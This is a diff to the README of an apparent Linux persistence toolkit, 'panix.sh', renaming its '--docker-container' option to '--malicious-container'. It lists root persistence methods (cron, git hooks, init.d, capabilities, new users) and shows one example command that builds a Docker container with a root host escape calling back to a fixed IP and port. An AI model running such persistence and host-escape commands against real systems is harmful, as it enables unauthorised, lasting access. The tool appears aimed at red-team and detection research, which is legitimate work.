@@ -97,7 +97,7 @@ Root User Options:
   --cap                 Add capabilities persistence
   --create-user         Create a new user
   --cron                Cron job persistence
-  --docker-container    Docker container with host escape
+  --malicious-container Docker container with host escape
   --generator           Generator persistence
   --git                 Git hook/pager persistence
   --initd               SysV Init (init.d) persistence
@@ -176,7 +176,7 @@ root
 ```
 The same goes for mechanisms that have additional built-in features such as the Docker persistence mechanism, with a built-in root host escape:
 ```
-ruben@ubuntu2204:~$ sudo ./panix.sh --docker-container --ip 192.168.211.131 --port 330
+ruben@ubuntu2204:~$ sudo ./panix.sh --malicious-container --ip 192.168.211.131 --port 330
 [+] Building 10.4s (9/9) FINISHED                                                                                                                                            docker:default
  => [internal] load build definition from Dockerfile                                                                                                                                   0.0s
  => => transferring dockerfile: 722B                                                                                                                                                   0.0s
